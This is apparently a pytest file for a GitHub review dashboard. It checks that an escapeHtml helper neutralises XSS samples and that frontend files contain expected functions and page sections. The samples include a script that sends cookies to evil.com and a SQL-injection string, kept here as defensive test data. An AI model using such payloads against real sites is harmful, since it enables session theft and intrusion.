"""Tests validating frontend logic patterns: escaping, debouncing, and honest reporting."""
import html
import pytest


def escape_html_py(text: str) -> str:
    """Python mirror of frontend escapeHtml function."""
    if text is None:
        return ""
    return html.escape(str(text), quote=True)


def test_html_escaping_prevents_xss():
    # Attack vectors in PR titles, usernames, or filenames
    malicious_inputs = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>fetch("http://evil.com/?cookie="+document.cookie)</script>',
        "contributor' OR '1'='1",
    ]

    for attack in malicious_inputs:
        escaped = escape_html_py(attack)
        assert "<script>" not in escaped
        assert "<img" not in escaped
        assert '"' not in escaped or '&quot;' in escaped
        assert "'" not in escaped or '&#x27;' in escaped or '&apos;' in escaped or '&#39;' in escaped


def test_frontend_files_use_escape_html():
    from pathlib import Path
    main_js_path = Path("frontend/js/main.js")
    content = main_js_path.read_text(encoding="utf-8")

    # Verify escapeHtml is defined and called across table and list renders
    assert "function escapeHtml" in content
    assert "escapeHtml(p.title" in content or "escapeHtml(p.number" in content
    assert "escapeHtml(r.slug" in content
    assert "escapeHtml(e.safety_notice" in content or "escapeHtml(e.id" in content


def test_frontend_index_uses_light_theme_elements():
    from pathlib import Path
    html_path = Path("frontend/index.html")
    content = html_path.read_text(encoding="utf-8")

    # Verify light theme navigation and 3 primary sections
    assert 'id="section-routing"' in content
    assert 'id="section-evidence"' in content
    assert 'id="section-health"' in content
    assert 'Review Routing' in content
    assert 'Evidence' in content
    assert 'Repository Health' in content

    # Verify absence of dark orbs or glassmorphism background
    assert 'class="bg-orbs"' not in content
    assert 'Track 01 Rubric' not in content

    # Verify ingestion panel exists
    assert 'Connect and Ingest GitHub Repository' in content
    assert 'ingest-repo-input' in content
    assert 'ingest-progress-bar' in content
